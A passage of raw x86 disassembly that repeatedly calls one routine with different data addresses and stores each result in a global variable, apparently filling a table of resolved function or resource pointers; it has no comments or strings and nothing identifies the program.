  40298f:	a3 f4 20 44 00       	mov    %eax,0x4420f4
  402994:	e8 06 e9 ff ff       	call   0x40129f
  402999:	68 14 49 43 00       	push   $0x434914
  40299e:	8b ce                	mov    %esi,%ecx
  4029a0:	a3 90 1b 44 00       	mov    %eax,0x441b90
  4029a5:	e8 f5 e8 ff ff       	call   0x40129f
  4029aa:	68 f8 48 43 00       	push   $0x4348f8
  4029af:	8b ce                	mov    %esi,%ecx
  4029b1:	a3 5c 21 44 00       	mov    %eax,0x44215c
  4029b6:	e8 e4 e8 ff ff       	call   0x40129f
  4029bb:	68 b8 48 43 00       	push   $0x4348b8
  4029c0:	8b ce                	mov    %esi,%ecx
  4029c2:	a3 bc 1b 44 00       	mov    %eax,0x441bbc
  4029c7:	e8 d3 e8 ff ff       	call   0x40129f
  4029cc:	68 ac 48 43 00       	push   $0x4348ac
  4029d1:	8b ce                	mov    %esi,%ecx
  4029d3:	a3 84 1b 44 00       	mov    %eax,0x441b84
  4029d8:	e8 c2 e8 ff ff       	call   0x40129f
  4029dd:	68 84 48 43 00       	push   $0x434884
  4029e2:	8b ce                	mov    %esi,%ecx
  4029e4:	a3 84 1d 44 00       	mov    %eax,0x441d84
  4029e9:	e8 b1 e8 ff ff       	call   0x40129f
  4029ee:	68 70 48 43 00       	push   $0x434870
  4029f3:	8b ce                	mov    %esi,%ecx
  4029f5:	a3 78 1f 44 00       	mov    %eax,0x441f78
  4029fa:	e8 a0 e8 ff ff       	call   0x40129f
  4029ff:	68 50 48 43 00       	push   $0x434850
  402a04:	8b ce                	mov    %esi,%ecx
  402a06:	a3 0c 1d 44 00       	mov    %eax,0x441d0c
  402a0b:	e8 8f e8 ff ff       	call   0x40129f
  402a10:	a3 a4 1d 44 00       	mov    %eax,0x441da4
  402a15:	68 40 48 43 00       	push   $0x434840
  402a1a:	8b ce                	mov    %esi,%ecx
  402a1c:	e8 7e e8 ff ff       	call   0x40129f
  402a21:	68 34 48 43 00       	push   $0x434834
  402a26:	8b ce                	mov    %esi,%ecx
  402a28:	a3 e0 22 44 00       	mov    %eax,0x4422e0
  402a2d:	e8 6d e8 ff ff       	call   0x40129f
  402a32:	68 18 48 43 00       	push   $0x434818
  402a37:	8b ce                	mov    %esi,%ecx
  402a39:	a3 d4 1f 44 00       	mov    %eax,0x441fd4
  402a3e:	e8 5c e8 ff ff       	call   0x40129f
  402a43:	68 fc 47 43 00       	push   $0x4347fc
  402a48:	8b ce                	mov    %esi,%ecx
  402a4a:	a3 78 1d 44 00       	mov    %eax,0x441d78
  402a4f:	e8 4b e8 ff ff       	call   0x40129f
  402a54:	68 e0 47 43 00       	push   $0x4347e0
  402a59:	8b ce                	mov    %esi,%ecx
  402a5b:	a3 a4 1e 44 00       	mov    %eax,0x441ea4
  402a60:	e8 3a e8 ff ff       	call   0x40129f
  402a65:	68 c4 47 43 00       	push   $0x4347c4
  402a6a:	8b ce                	mov    %esi,%ecx
  402a6c:	a3 60 20 44 00       	mov    %eax,0x442060
  402a71:	e8 29 e8 ff ff       	call   0x40129f
  402a76:	68 ac 47 43 00       	push   $0x4347ac
  402a7b:	8b ce                	mov    %esi,%ecx
  402a7d:	a3 94 1c 44 00       	mov    %eax,0x441c94
  402a82:	e8 18 e8 ff ff       	call   0x40129f
  402a87:	68 94 47 43 00       	push   $0x434794
  402a8c:	8b ce                	mov    %esi,%ecx
  402a8e:	a3 bc 1d 44 00       	mov    %eax,0x441dbc
  402a93:	e8 07 e8 ff ff       	call   0x40129f
  402a98:	68 68 47 43 00       	push   $0x434768
  402a9d:	8b ce                	mov    %esi,%ecx
  402a9f:	a3 78 21 44 00       	mov    %eax,0x442178
  402aa4:	e8 f6 e7 ff ff       	call   0x40129f
  402aa9:	68 5c 47 43 00       	push   $0x43475c
  402aae:	8b ce                	mov    %esi,%ecx
  402ab0:	a3 98 1e 44 00       	mov    %eax,0x441e98
  402ab5:	e8 e5 e7 ff ff       	call   0x40129f
  402aba:	68 50 47 43 00       	push   $0x434750
  402abf:	8b ce                	mov    %esi,%ecx
  402ac1:	a3 3c 1f 44 00       	mov    %eax,0x441f3c
  402ac6:	e8 d4 e7 ff ff       	call   0x40129f
  402acb:	68 40 47 43 00       	push   $0x434740
  402ad0:	8b ce                	mov    %esi,%ecx
  402ad2:	a3 30 22 44 00       	mov    %eax,0x442230
  402ad7:	e8 c3 e7 ff ff       	call   0x40129f
  402adc:	68 2c 47 43 00       	push   $0x43472c
  402ae1:	8b ce                	mov    %esi,%ecx
  402ae3:	a3 1c 1d 44 00       	mov    %eax,0x441d1c
  402ae8:	e8 b2 e7 ff ff       	call   0x40129f
  402aed:	68 1c 47 43 00       	push   $0x43471c
  402af2:	8b ce                	mov    %esi,%ecx
  402af4:	a3 f0 21 44 00       	mov    %eax,0x4421f0
  402af9:	e8 a1 e7 ff ff       	call   0x40129f
  402afe:	68 b0 46 43 00       	push   $0x4346b0
  402b03:	8b ce                	mov    %esi,%ecx
  402b05:	a3 64 21 44 00       	mov    %eax,0x442164
  402b0a:	e8 90 e7 ff ff       	call   0x40129f
  402b0f:	68 88 46 43 00       	push   $0x434688
  402b14:	8b ce                	mov    %esi,%ecx
  402b16:	a3 b0 1c 44 00       	mov    %eax,0x441cb0
  402b1b:	e8 7f e7 ff ff       	call   0x40129f
  402b20:	68 48 46 43 00       	push   $0x434648
  402b25:	8b ce                	mov    %esi,%ecx
  402b27:	a3 64 1d 44 00       	mov    %eax,0x441d64
  402b2c:	e8 6e e7 ff ff       	call   0x40129f
  402b31:	68 38 46 43 00       	push   $0x434638
  402b36:	8b ce                	mov    %esi,%ecx
  402b38:	a3 3c 1b 44 00       	mov    %eax,0x441b3c
  402b3d:	e8 5d e7 ff ff       	call   0x40129f
  402b42:	68 20 46 43 00       	push   $0x434620
  402b47:	8b ce                	mov    %esi,%ecx
  402b49:	a3 34 1e 44 00       	mov    %eax,0x441e34
  402b4e:	e8 4c e7 ff ff       	call   0x40129f
  402b53:	68 04 46 43 00       	push   $0x434604
  402b58:	8b ce                	mov    %esi,%ecx
  402b5a:	a3 bc 1f 44 00       	mov    %eax,0x441fbc
  402b5f:	e8 3b e7 ff ff       	call   0x40129f
  402b64:	a3 00 1b 44 00       	mov    %eax,0x441b00
  402b69:	68 ec 45 43 00       	push   $0x4345ec
  402b6e:	8b ce                	mov    %esi,%ecx
  402b70:	e8 2a e7 ff ff       	call   0x40129f
  402b75:	68 d4 45 43 00       	push   $0x4345d4
  402b7a:	8b ce                	mov    %esi,%ecx
  402b7c:	a3 80 1b 44 00       	mov    %eax,0x441b80
  402b81:	e8 19 e7 ff ff       	call   0x40129f
  402b86:	68 a4 45 43 00       	push   $0x4345a4
  402b8b:	8b ce                	mov    %esi,%ecx
  402b8d:	a3 b8 1b 44 00       	mov    %eax,0x441bb8
  402b92:	e8 08 e7 ff ff       	call   0x40129f
  402b97:	68 90 45 43 00       	push   $0x434590
  402b9c:	8b ce                	mov    %esi,%ecx
  402b9e:	a3 d0 1e 44 00       	mov    %eax,0x441ed0
  402ba3:	e8 f7 e6 ff ff       	call   0x40129f
  402ba8:	68 54 45 43 00       	push   $0x434554
  402bad:	8b ce                	mov    %esi,%ecx
  402baf:	a3 34 1d 44 00       	mov    %eax,0x441d34
  402bb4:	e8 e6 e6 ff ff       	call   0x40129f
  402bb9:	68 3c 45 43 00       	push   $0x43453c
  402bbe:	8b ce                	mov    %esi,%ecx
  402bc0:	a3 5c 20 44 00       	mov    %eax,0x44205c
  402bc5:	e8 d5 e6 ff ff       	call   0x40129f
  402bca:	68 28 45 43 00       	push   $0x434528
  402bcf:	8b ce                	mov    %esi,%ecx
  402bd1:	a3 9c 1d 44 00       	mov    %eax,0x441d9c
  402bd6:	e8 c4 e6 ff ff       	call   0x40129f
  402bdb:	68 18 45 43 00       	push   $0x434518
  402be0:	8b ce                	mov    %esi,%ecx
  402be2:	a3 c8 1c 44 00       	mov    %eax,0x441cc8
  402be7:	e8 b3 e6 ff ff       	call   0x40129f
  402bec:	68 04 45 43 00       	push   $0x434504
  402bf1:	8b ce                	mov    %esi,%ecx
  402bf3:	a3 2c 1c 44 00       	mov    %eax,0x441c2c
  402bf8:	e8 a2 e6 ff ff       	call   0x40129f
  402bfd:	68 f4 44 43 00       	push   $0x4344f4
  402c02:	8b ce                	mov    %esi,%ecx
  402c04:	a3 74 1d 44 00       	mov    %eax,0x441d74
  402c09:	e8 91 e6 ff ff       	call   0x40129f
  402c0e:	68 e4 44 43 00       	push   $0x4344e4
  402c13:	8b ce                	mov    %esi,%ecx
  402c15:	a3 b4 22 44 00       	mov    %eax,0x4422b4
  402c1a:	e8 80 e6 ff ff       	call   0x40129f
  402c1f:	68 d4 44 43 00       	push   $0x4344d4
  402c24:	8b ce                	mov    %esi,%ecx
  402c26:	a3 94 1e 44 00       	mov    %eax,0x441e94
  402c2b:	e8 6f e6 ff ff       	call   0x40129f
  402c30:	68 b8 44 43 00       	push   $0x4344b8
  402c35:	8b ce                	mov    %esi,%ecx
  402c37:	a3 e4 22 44 00       	mov    %eax,0x4422e4
  402c3c:	e8 5e e6 ff ff       	call   0x40129f
  402c41:	68 94 44 43 00       	push   $0x434494
  402c46:	8b ce                	mov    %esi,%ecx
  402c48:	a3 14 21 44 00       	mov    %eax,0x442114
  402c4d:	e8 4d e6 ff ff       	call   0x40129f
  402c52:	68 70 44 43 00       	push   $0x434470
  402c57:	8b ce                	mov    %esi,%ecx
  402c59:	a3 e0 20 44 00       	mov    %eax,0x4420e0
  402c5e:	e8 3c e6 ff ff       	call   0x40129f
  402c63:	68 60 44 43 00       	push   $0x434460
  402c68:	8b ce                	mov    %esi,%ecx
  402c6a:	a3 4c 1f 44 00       	mov    %eax,0x441f4c
  402c6f:	e8 2b e6 ff ff       	call   0x40129f
  402c74:	68 30 44 43 00       	push   $0x434430
  402c79:	8b ce                	mov    %esi,%ecx
  402c7b:	a3 28 1c 44 00       	mov    %eax,0x441c28
  402c80:	e8 1a e6 ff ff       	call   0x40129f
  402c85:	68 18 44 43 00       	push   $0x434418
  402c8a:	8b ce                	mov    %esi,%ecx
  402c8c:	a3 fc 1a 44 00       	mov    %eax,0x441afc
  402c91:	e8 09 e6 ff ff       	call   0x40129f
  402c96:	68 04 44 43 00       	push   $0x434404
  402c9b:	8b ce                	mov    %esi,%ecx
  402c9d:	a3 a4 20 44 00       	mov    %eax,0x4420a4
  402ca2:	e8 f8 e5 ff ff       	call   0x40129f
  402ca7:	68 f4 43 43 00       	push   $0x4343f4
  402cac:	8b ce                	mov    %esi,%ecx
  402cae:	a3 cc 21 44 00       	mov    %eax,0x4421cc
  402cb3:	e8 e7 e5 ff ff       	call   0x40129f
  402cb8:	68 e8 43 43 00       	push   $0x4343e8
  402cbd:	8b ce                	mov    %esi,%ecx
  402cbf:	a3 0c 1b 44 00       	mov    %eax,0x441b0c
  402cc4:	e8 d6 e5 ff ff       	call   0x40129f
  402cc9:	68 d4 43 43 00       	push   $0x4343d4
  402cce:	8b ce                	mov    %esi,%ecx
  402cd0:	a3 60 21 44 00       	mov    %eax,0x442160
  402cd5:	e8 c5 e5 ff ff       	call   0x40129f
  402cda:	68 c8 43 43 00       	push   $0x4343c8
  402cdf:	8b ce                	mov    %esi,%ecx
  402ce1:	a3 60 1d 44 00       	mov    %eax,0x441d60
  402ce6:	e8 b4 e5 ff ff       	call   0x40129f
  402ceb:	68 bc 43 43 00       	push   $0x4343bc
  402cf0:	8b ce                	mov    %esi,%ecx
  402cf2:	a3 10 21 44 00       	mov    %eax,0x442110
  402cf7:	e8 a3 e5 ff ff       	call   0x40129f
  402cfc:	68 b0 43 43 00       	push   $0x4343b0
  402d01:	8b ce                	mov    %esi,%ecx
  402d03:	a3 a8 21 44 00       	mov    %eax,0x4421a8
  402d08:	e8 92 e5 ff ff       	call   0x40129f
  402d0d:	68 90 43 43 00       	push   $0x434390
  402d12:	8b ce                	mov    %esi,%ecx
  402d14:	a3 a0 22 44 00       	mov    %eax,0x4422a0
  402d19:	e8 81 e5 ff ff       	call   0x40129f
  402d1e:	68 80 43 43 00       	push   $0x434380
  402d23:	8b ce                	mov    %esi,%ecx
  402d25:	a3 c0 1c 44 00       	mov    %eax,0x441cc0
  402d2a:	e8 70 e5 ff ff       	call   0x40129f
  402d2f:	68 68 43 43 00       	push   $0x434368
  402d34:	8b ce                	mov    %esi,%ecx
  402d36:	a3 cc 1d 44 00       	mov    %eax,0x441dcc
  402d3b:	e8 5f e5 ff ff       	call   0x40129f
  402d40:	68 54 43 43 00       	push   $0x434354
  402d45:	8b ce                	mov    %esi,%ecx
  402d47:	a3 24 21 44 00       	mov    %eax,0x442124
  402d4c:	e8 4e e5 ff ff       	call   0x40129f
  402d51:	68 34 43 43 00       	push   $0x434334
  402d56:	8b ce                	mov    %esi,%ecx
  402d58:	a3 68 1c 44 00       	mov    %eax,0x441c68
  402d5d:	e8 3d e5 ff ff       	call   0x40129f
  402d62:	68 18 43 43 00       	push   $0x434318
  402d67:	8b ce                	mov    %esi,%ecx
  402d69:	a3 f0 20 44 00       	mov    %eax,0x4420f0
  402d6e:	e8 2c e5 ff ff       	call   0x40129f
  402d73:	68 f8 42 43 00       	push   $0x4342f8
  402d78:	8b ce                	mov    %esi,%ecx
  402d7a:	a3 cc 1e 44 00       	mov    %eax,0x441ecc
  402d7f:	e8 1b e5 ff ff       	call   0x40129f
  402d84:	68 e4 42 43 00       	push   $0x4342e4
  402d89:	8b ce                	mov    %esi,%ecx
  402d8b:	a3 38 1f 44 00       	mov    %eax,0x441f38
  402d90:	e8 0a e5 ff ff       	call   0x40129f
  402d95:	68 d0 42 43 00       	push   $0x4342d0
  402d9a:	8b ce                	mov    %esi,%ecx
  402d9c:	a3 00 23 44 00       	mov    %eax,0x442300
  402da1:	e8 f9 e4 ff ff       	call   0x40129f
  402da6:	68 bc 42 43 00       	push   $0x4342bc
  402dab:	8b ce                	mov    %esi,%ecx
  402dad:	a3 24 1b 44 00       	mov    %eax,0x441b24
  402db2:	e8 e8 e4 ff ff       	call   0x40129f
  402db7:	68 a8 42 43 00       	push   $0x4342a8
  402dbc:	8b ce                	mov    %esi,%ecx
  402dbe:	a3 48 21 44 00       	mov    %eax,0x442148
  402dc3:	e8 d7 e4 ff ff       	call   0x40129f
  402dc8:	68 94 42 43 00       	push   $0x434294
  402dcd:	8b ce                	mov    %esi,%ecx
  402dcf:	a3 58 1b 44 00       	mov    %eax,0x441b58
  402dd4:	e8 c6 e4 ff ff       	call   0x40129f
  402dd9:	68 88 42 43 00       	push   $0x434288
  402dde:	8b ce                	mov    %esi,%ecx
  402de0:	a3 d0 1b 44 00       	mov    %eax,0x441bd0
  402de5:	e8 b5 e4 ff ff       	call   0x40129f
  402dea:	68 74 42 43 00       	push   $0x434274
  402def:	8b ce                	mov    %esi,%ecx
  402df1:	a3 14 1c 44 00       	mov    %eax,0x441c14
  402df6:	e8 a4 e4 ff ff       	call   0x40129f
  402dfb:	68 60 42 43 00       	push   $0x434260
  402e00:	8b ce                	mov    %esi,%ecx
  402e02:	a3 4c 20 44 00       	mov    %eax,0x44204c
  402e07:	e8 93 e4 ff ff       	call   0x40129f
  402e0c:	68 4c 42 43 00       	push   $0x43424c
  402e11:	8b ce                	mov    %esi,%ecx
  402e13:	a3 a4 1c 44 00       	mov    %eax,0x441ca4
  402e18:	e8 82 e4 ff ff       	call   0x40129f
  402e1d:	a3 cc 1b 44 00       	mov    %eax,0x441bcc
  402e22:	68 30 42 43 00       	push   $0x434230
  402e27:	8b ce                	mov    %esi,%ecx
  402e29:	e8 71 e4 ff ff       	call   0x40129f
  402e2e:	68 00 42 43 00       	push   $0x434200
  402e33:	8b ce                	mov    %esi,%ecx
  402e35:	a3 30 1e 44 00       	mov    %eax,0x441e30
  402e3a:	e8 60 e4 ff ff       	call   0x40129f
  402e3f:	68 f0 41 43 00       	push   $0x4341f0
  402e44:	8b ce                	mov    %esi,%ecx
  402e46:	a3 54 22 44 00       	mov    %eax,0x442254
  402e4b:	e8 4f e4 ff ff       	call   0x40129f
  402e50:	68 c0 41 43 00       	push   $0x4341c0
  402e55:	8b ce                	mov    %esi,%ecx
  402e57:	a3 40 1c 44 00       	mov    %eax,0x441c40
  402e5c:	e8 3e e4 ff ff       	call   0x40129f
  402e61:	68 b0 41 43 00       	push   $0x4341b0
  402e66:	8b ce                	mov    %esi,%ecx
  402e68:	a3 78 22 44 00       	mov    %eax,0x442278
  402e6d:	e8 2d e4 ff ff       	call   0x40129f
  402e72:	68 80 41 43 00       	push   $0x434180
  402e77:	8b ce                	mov    %esi,%ecx
  402e79:	a3 b8 22 44 00       	mov    %eax,0x4422b8
  402e7e:	e8 1c e4 ff ff       	call   0x40129f
  402e83:	68 64 41 43 00       	push   $0x434164
  402e88:	8b ce                	mov    %esi,%ecx
  402e8a:	a3 04 1f 44 00       	mov    %eax,0x441f04
  402e8f:	e8 0b e4 ff ff       	call   0x40129f
  402e94:	68 34 41 43 00       	push   $0x434134
  402e99:	8b ce                	mov    %esi,%ecx
  402e9b:	a3 c8 22 44 00       	mov    %eax,0x4422c8
  402ea0:	e8 fa e3 ff ff       	call   0x40129f
  402ea5:	68 28 41 43 00       	push   $0x434128
  402eaa:	8b ce                	mov    %esi,%ecx
  402eac:	a3 58 20 44 00       	mov    %eax,0x442058
  402eb1:	e8 e9 e3 ff ff       	call   0x40129f
  402eb6:	68 f8 40 43 00       	push   $0x4340f8
  402ebb:	8b ce                	mov    %esi,%ecx
  402ebd:	a3 9c 1c 44 00       	mov    %eax,0x441c9c
  402ec2:	e8 d8 e3 ff ff       	call   0x40129f
  402ec7:	68 e4 40 43 00       	push   $0x4340e4
  402ecc:	8b ce                	mov    %esi,%ecx
  402ece:	a3 a0 1d 44 00       	mov    %eax,0x441da0
  402ed3:	e8 c7 e3 ff ff       	call   0x40129f
  402ed8:	68 b4 40 43 00       	push   $0x4340b4
  402edd:	8b ce                	mov    %esi,%ecx
  402edf:	a3 38 1b 44 00       	mov    %eax,0x441b38
  402ee4:	e8 b6 e3 ff ff       	call   0x40129f
  402ee9:	68 a0 40 43 00       	push   $0x4340a0
  402eee:	8b ce                	mov    %esi,%ecx
  402ef0:	a3 dc 1d 44 00       	mov    %eax,0x441ddc
  402ef5:	e8 a5 e3 ff ff       	call   0x40129f
  402efa:	68 70 40 43 00       	push   $0x434070
  402eff:	8b ce                	mov    %esi,%ecx
  402f01:	a3 b4 1c 44 00       	mov    %eax,0x441cb4
  402f06:	e8 94 e3 ff ff       	call   0x40129f
  402f0b:	68 60 40 43 00       	push   $0x434060
  402f10:	8b ce                	mov    %esi,%ecx
  402f12:	a3 68 1b 44 00       	mov    %eax,0x441b68
  402f17:	e8 83 e3 ff ff       	call   0x40129f
  402f1c:	68 30 40 43 00       	push   $0x434030
  402f21:	8b ce                	mov    %esi,%ecx
  402f23:	a3 b0 21 44 00       	mov    %eax,0x4421b0
  402f28:	e8 72 e3 ff ff       	call   0x40129f
  402f2d:	68 24 40 43 00       	push   $0x434024
  402f32:	8b ce                	mov    %esi,%ecx
  402f34:	a3 b0 1d 44 00       	mov    %eax,0x441db0
  402f39:	e8 61 e3 ff ff       	call   0x40129f
  402f3e:	68 f4 3f 43 00       	push   $0x433ff4
  402f43:	8b ce                	mov    %esi,%ecx
  402f45:	a3 d4 1b 44 00       	mov    %eax,0x441bd4
  402f4a:	e8 50 e3 ff ff       	call   0x40129f
  402f4f:	68 e0 3f 43 00       	push   $0x433fe0
  402f54:	8b ce                	mov    %esi,%ecx
  402f56:	a3 60 1f 44 00       	mov    %eax,0x441f60
  402f5b:	e8 3f e3 ff ff       	call   0x40129f
  402f60:	68 b0 3f 43 00       	push   $0x433fb0
  402f65:	8b ce                	mov    %esi,%ecx
  402f67:	a3 c4 20 44 00       	mov    %eax,0x4420c4
  402f6c:	e8 2e e3 ff ff       	call   0x40129f
  402f71:	a3 14 23 44 00       	mov    %eax,0x442314
  402f76:	68 9c 3f 43 00       	push   $0x433f9c
  402f7b:	8b ce                	mov    %esi,%ecx
  402f7d:	e8 1d e3 ff ff       	call   0x40129f
  402f82:	68 6c 3f 43 00       	push   $0x433f6c
  402f87:	8b ce                	mov    %esi,%ecx
  402f89:	a3 70 1f 44 00       	mov    %eax,0x441f70
  402f8e:	e8 0c e3 ff ff       	call   0x40129f
  402f93:	68 58 3f 43 00       	push   $0x433f58
  402f98:	8b ce                	mov    %esi,%ecx
  402f9a:	a3 08 20 44 00       	mov    %eax,0x442008
  402f9f:	e8 fb e2 ff ff       	call   0x40129f
  402fa4:	68 28 3f 43 00       	push   $0x433f28
  402fa9:	8b ce                	mov    %esi,%ecx
  402fab:	a3 00 1d 44 00       	mov    %eax,0x441d00
  402fb0:	e8 ea e2 ff ff       	call   0x40129f
  402fb5:	68 18 3f 43 00       	push   $0x433f18
  402fba:	8b ce                	mov    %esi,%ecx
  402fbc:	a3 84 22 44 00       	mov    %eax,0x442284
  402fc1:	e8 d9 e2 ff ff       	call   0x40129f
  402fc6:	68 e8 3e 43 00       	push   $0x433ee8
  402fcb:	8b ce                	mov    %esi,%ecx
  402fcd:	a3 04 1e 44 00       	mov    %eax,0x441e04
  402fd2:	e8 c8 e2 ff ff       	call   0x40129f
  402fd7:	68 dc 3e 43 00       	push   $0x433edc
  402fdc:	8b ce                	mov    %esi,%ecx
  402fde:	a3 ac 1c 44 00       	mov    %eax,0x441cac
  402fe3:	e8 b7 e2 ff ff       	call   0x40129f
  402fe8:	68 ac 3e 43 00       	push   $0x433eac
  402fed:	8b ce                	mov    %esi,%ecx
  402fef:	a3 14 20 44 00       	mov    %eax,0x442014
  402ff4:	e8 a6 e2 ff ff       	call   0x40129f
  402ff9:	68 a0 3e 43 00       	push   $0x433ea0
  402ffe:	8b ce                	mov    %esi,%ecx
  403000:	a3 70 1c 44 00       	mov    %eax,0x441c70
  403005:	e8 95 e2 ff ff       	call   0x40129f
  40300a:	68 70 3e 43 00       	push   $0x433e70
  40300f:	8b ce                	mov    %esi,%ecx
  403011:	a3 8c 1d 44 00       	mov    %eax,0x441d8c
  403016:	e8 84 e2 ff ff       	call   0x40129f
  40301b:	68 5c 3e 43 00       	push   $0x433e5c
  403020:	8b ce                	mov    %esi,%ecx
  403022:	a3 34 1b 44 00       	mov    %eax,0x441b34
  403027:	e8 73 e2 ff ff       	call   0x40129f
  40302c:	68 2c 3e 43 00       	push   $0x433e2c
  403031:	8b ce                	mov    %esi,%ecx
  403033:	a3 20 20 44 00       	mov    %eax,0x442020
  403038:	e8 62 e2 ff ff       	call   0x40129f
  40303d:	68 18 3e 43 00       	push   $0x433e18
  403042:	8b ce                	mov    %esi,%ecx
  403044:	a3 2c 22 44 00       	mov    %eax,0x44222c
  403049:	e8 51 e2 ff ff       	call   0x40129f
  40304e:	68 e8 3d 43 00       	push   $0x433de8
  403053:	8b ce                	mov    %esi,%ecx
  403055:	a3 28 20 44 00       	mov    %eax,0x442028
  40305a:	e8 40 e2 ff ff       	call   0x40129f
  40305f:	68 d8 3d 43 00       	push   $0x433dd8
  403064:	8b ce                	mov    %esi,%ecx
  403066:	a3 b0 22 44 00       	mov    %eax,0x4422b0
  40306b:	e8 2f e2 ff ff       	call   0x40129f
  403070:	68 a8 3d 43 00       	push   $0x433da8
  403075:	8b ce                	mov    %esi,%ecx
  403077:	a3 0c 20 44 00       	mov    %eax,0x44200c
  40307c:	e8 1e e2 ff ff       	call   0x40129f
  403081:	68 94 3d 43 00       	push   $0x433d94
  403086:	8b ce                	mov    %esi,%ecx
  403088:	a3 fc 1b 44 00       	mov    %eax,0x441bfc
  40308d:	e8 0d e2 ff ff       	call   0x40129f
  403092:	68 64 3d 43 00       	push   $0x433d64
  403097:	8b ce                	mov    %esi,%ecx
  403099:	a3 50 21 44 00       	mov    %eax,0x442150
  40309e:	e8 fc e1 ff ff       	call   0x40129f
  4030a3:	68 4c 3d 43 00       	push   $0x433d4c
  4030a8:	8b ce                	mov    %esi,%ecx
  4030aa:	a3 8c 20 44 00       	mov    %eax,0x44208c
  4030af:	e8 eb e1 ff ff       	call   0x40129f
  4030b4:	68 1c 3d 43 00       	push   $0x433d1c
  4030b9:	8b ce                	mov    %esi,%ecx
  4030bb:	a3 5c 1f 44 00       	mov    %eax,0x441f5c
  4030c0:	e8 da e1 ff ff       	call   0x40129f
  4030c5:	a3 b8 21 44 00       	mov    %eax,0x4421b8
  4030ca:	68 04 3d 43 00       	push   $0x433d04
  4030cf:	8b ce                	mov    %esi,%ecx
  4030d1:	e8 c9 e1 ff ff       	call   0x40129f
  4030d6:	68 d4 3c 43 00       	push   $0x433cd4
  4030db:	8b ce                	mov    %esi,%ecx
  4030dd:	a3 ac 1d 44 00       	mov    %eax,0x441dac
  4030e2:	e8 b8 e1 ff ff       	call   0x40129f
  4030e7:	68 c8 3c 43 00       	push   $0x433cc8
  4030ec:	8b ce                	mov    %esi,%ecx
  4030ee:	a3 fc 1d 44 00       	mov    %eax,0x441dfc
  4030f3:	e8 a7 e1 ff ff       	call   0x40129f
  4030f8:	68 98 3c 43 00       	push   $0x433c98
  4030fd:	8b ce                	mov    %esi,%ecx
  4030ff:	a3 98 22 44 00       	mov    %eax,0x442298
  403104:	e8 96 e1 ff ff       	call   0x40129f
  403109:	68 8c 3c 43 00       	push   $0x433c8c
  40310e:	8b ce                	mov    %esi,%ecx
  403110:	a3 e0 1f 44 00       	mov    %eax,0x441fe0
  403115:	e8 85 e1 ff ff       	call   0x40129f
  40311a:	68 5c 3c 43 00       	push   $0x433c5c
  40311f:	8b ce                	mov    %esi,%ecx
  403121:	a3 a0 1b 44 00       	mov    %eax,0x441ba0
  403126:	e8 74 e1 ff ff       	call   0x40129f
  40312b:	68 48 3c 43 00       	push   $0x433c48
  403130:	8b ce                	mov    %esi,%ecx
  403132:	a3 80 22 44 00       	mov    %eax,0x442280
  403137:	e8 63 e1 ff ff       	call   0x40129f
  40313c:	68 18 3c 43 00       	push   $0x433c18
  403141:	8b ce                	mov    %esi,%ecx
  403143:	a3 98 1c 44 00       	mov    %eax,0x441c98
  403148:	e8 52 e1 ff ff       	call   0x40129f
  40314d:	68 00 3c 43 00       	push   $0x433c00
  403152:	8b ce                	mov    %esi,%ecx
  403154:	a3 c4 21 44 00       	mov    %eax,0x4421c4
  403159:	e8 41 e1 ff ff       	call   0x40129f
  40315e:	68 d0 3b 43 00       	push   $0x433bd0
  403163:	8b ce                	mov    %esi,%ecx
  403165:	a3 dc 1f 44 00       	mov    %eax,0x441fdc
  40316a:	e8 30 e1 ff ff       	call   0x40129f
  40316f:	68 c4 3b 43 00       	push   $0x433bc4
  403174:	8b ce                	mov    %esi,%ecx
  403176:	a3 f8 20 44 00       	mov    %eax,0x4420f8
  40317b:	e8 1f e1 ff ff       	call   0x40129f
  403180:	68 94 3b 43 00       	push   $0x433b94
  403185:	8b ce                	mov    %esi,%ecx
  403187:	a3 a8 1d 44 00       	mov    %eax,0x441da8
  40318c:	e8 0e e1 ff ff       	call   0x40129f
  403191:	68 84 3b 43 00       	push   $0x433b84
  403196:	8b ce                	mov    %esi,%ecx
  403198:	a3 88 1c 44 00       	mov    %eax,0x441c88
  40319d:	e8 fd e0 ff ff       	call   0x40129f
  4031a2:	68 54 3b 43 00       	push   $0x433b54
  4031a7:	8b ce                	mov    %esi,%ecx
  4031a9:	a3 24 22 44 00       	mov    %eax,0x442224
  4031ae:	e8 ec e0 ff ff       	call   0x40129f
  4031b3:	68 48 3b 43 00       	push   $0x433b48
  4031b8:	8b ce                	mov    %esi,%ecx
  4031ba:	a3 70 22 44 00       	mov    %eax,0x442270
  4031bf:	e8 db e0 ff ff       	call   0x40129f
  4031c4:	68 18 3b 43 00       	push   $0x433b18
  4031c9:	8b ce                	mov    %esi,%ecx
  4031cb:	a3 68 22 44 00       	mov    %eax,0x442268
  4031d0:	e8 ca e0 ff ff       	call   0x40129f
  4031d5:	68 04 3b 43 00       	push   $0x433b04
  4031da:	8b ce                	mov    %esi,%ecx
  4031dc:	a3 ec 1f 44 00       	mov    %eax,0x441fec
  4031e1:	e8 b9 e0 ff ff       	call   0x40129f
  4031e6:	68 d4 3a 43 00       	push   $0x433ad4
  4031eb:	8b ce                	mov    %esi,%ecx
  4031ed:	a3 f4 1d 44 00       	mov    %eax,0x441df4
  4031f2:	e8 a8 e0 ff ff       	call   0x40129f
  4031f7:	68 c0 3a 43 00       	push   $0x433ac0
  4031fc:	8b ce                	mov    %esi,%ecx
  4031fe:	a3 64 22 44 00       	mov    %eax,0x442264
  403203:	e8 97 e0 ff ff       	call   0x40129f
  403208:	68 90 3a 43 00       	push   $0x433a90
  40320d:	8b ce                	mov    %esi,%ecx
  40320f:	a3 5c 1b 44 00       	mov    %eax,0x441b5c
  403214:	e8 86 e0 ff ff       	call   0x40129f
  403219:	68 6c 3a 43 00       	push   $0x433a6c
  40321e:	8b ce                	mov    %esi,%ecx
  403220:	a3 f4 1f 44 00       	mov    %eax,0x441ff4
  403225:	e8 75 e0 ff ff       	call   0x40129f
  40322a:	68 3c 3a 43 00       	push   $0x433a3c
  40322f:	8b ce                	mov    %esi,%ecx
  403231:	a3 9c 20 44 00       	mov    %eax,0x44209c
  403236:	e8 64 e0 ff ff       	call   0x40129f
  40323b:	68 30 3a 43 00       	push   $0x433a30
  403240:	8b ce                	mov    %esi,%ecx
  403242:	a3 70 1e 44 00       	mov    %eax,0x441e70
  403247:	e8 53 e0 ff ff       	call   0x40129f
  40324c:	68 00 3a 43 00       	push   $0x433a00
  403251:	8b ce                	mov    %esi,%ecx
  403253:	a3 44 20 44 00       	mov    %eax,0x442044
  403258:	e8 42 e0 ff ff       	call   0x40129f
  40325d:	68 f0 39 43 00       	push   $0x4339f0
